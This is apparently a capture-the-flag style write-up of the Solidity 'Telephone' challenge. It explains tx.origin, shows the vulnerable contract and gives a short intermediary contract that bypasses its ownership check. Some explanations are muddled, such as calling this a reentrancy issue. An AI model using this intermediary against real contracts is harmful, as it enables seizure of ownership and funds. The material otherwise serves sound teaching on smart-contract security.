# Telephone Contract has an Access-Control Vulnerability

## How tx.origin Works
- In Ethereum, a transaction originates from an externally owned account (EOA), which could be a user’s wallet, and may then interact with a smart contract. When the smart contract is called, it can access tx.origin, which will be the address of the EOA that started the transaction, even if the call is forwarded or chained through multiple contracts.

## Issues with tx.origin
- While tx.origin can be useful in some cases, it has been known to introduce several problems, especially when used incorrectly or in certain patterns:

## Security Vulnerabilities (Reentrancy Attacks):
- Using tx.origin in a contract to determine the origin of a transaction can create vulnerabilities, especially when interacting with external contracts. For example, an attacker could exploit this by creating a contract that calls another contract, potentially bypassing the intended access control. If the contract logic is relying on tx.origin, it might mistakenly identify the attacker as the legitimate user.

### Example: 
- A contract that uses tx.origin to check if the transaction is initiated by an external user might be tricked into executing sensitive logic if the attacker’s contract intermediates the transaction.

## Risk of Misuse in Access Control:
- If a contract relies on tx.origin for access control, it can lead to unwanted behaviors. For instance, using tx.origin to check if a transaction is initiated by a specific address can cause problems when interacting with other contracts. This is because the tx.origin will always refer to the originating external account and not the contract intermediary, which can break the access control logic.

  
## Telephone is Vulnerable
- Read and analyze code based on provided knowledge.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}


```
## Intermediary Contract
- This contract calls the Telephone contract, thus bypassing the Access-Control check.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract Inpersonate {
    address public owner;
    Telephone public telephone_victim;

    constructor(Telephone _telephone_victim){
        telephone_victim = Telephone(_telephone_victim);
        owner = msg.sender;

    }

    function change() public {
        telephone_victim.changeOwner(owner);
    }
       
}
```

## Vulnerability in Action:<br />
- The Telephone contract has a vulnerability where it checks tx.origin (the original address that initiated the transaction) to determine access control or perform some sensitive operation, it can be tricked by an intermediary contract like Contract A.<br />

- In this case, even though the Inpersonate contract called the Telephone contract,  the Telephone contract will still see tx.origin as your address.<br />

- Since the Telephone contract has a condition like require(tx.origin != msg.sender), it will mistakenly think you (the original transaction sender) are the one interacting, even though the Inpersonate contract is the one calling it. <br /> This effectively bypasses any access control that was relying on tx.origin.

## Conclusion:<br />
- This is a classic security vulnerability in Solidity when relying on tx.origin for access control. It's crucial to never rely on tx.origin to validate the origin of a transaction for things like permissions or sensitive actions. Instead, you should use msg.sender, which refers to the immediate caller of the function, and properly enforce access control with explicit logic.
